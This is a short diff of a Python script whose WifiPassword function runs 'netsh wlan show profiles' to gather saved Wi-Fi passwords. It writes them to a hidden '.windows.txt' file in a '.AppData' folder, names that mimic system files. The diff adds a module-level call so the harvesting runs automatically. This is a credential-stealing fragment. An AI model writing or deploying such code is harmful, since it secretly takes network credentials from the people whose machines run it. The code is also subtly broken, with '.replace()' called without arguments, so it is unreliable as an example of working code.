@@ -4,6 +4,8 @@ import os
 import re
 
 def WifiPassword():
+    
+
     Directory_Name = ".AppData"
     File_Name = ".windows.txt" 
     Get_Profiles = subprocess.getoutput("netsh wlan show profiles").replace()
@@ -19,6 +21,6 @@ def WifiPassword():
         with open(file_path, "w") as f :
             f.write(Wifi_password + "\n") 
 
-
+WifiPassword()
 
 
